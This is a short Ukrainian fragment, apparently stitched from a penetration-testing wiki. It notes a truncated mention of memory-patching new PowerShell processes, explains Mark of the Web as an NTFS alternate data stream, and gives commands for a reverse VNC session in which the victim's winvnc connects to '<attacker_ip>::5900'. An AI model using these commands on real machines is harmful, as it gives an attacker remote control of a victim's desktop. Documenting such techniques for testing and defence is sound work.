...
Або цей скрипт, який через пам'ятеве патчування буде патчити кожен новий Powersh
...
**MoTW** (Mark of The Web) - це [NTFS Alternate Data Stream](https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_\(ADS\)) з назвою Zone.Identifier, яка автоматично створюється під час завантаження файлів з Інтернету разом з URL-адресою, з якої вони були завантажені.
...
**Атакуючий** повинен **виконати всередині** свого **хоста** бінарний файл `vncviewer.exe -listen 5900`, щоб він був **підготовлений** для прийому зворотного **VNC з'єднання**. Потім, всередині **жертви**: Запустіть демон winvnc `winvnc.exe -run` і запустіть `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`
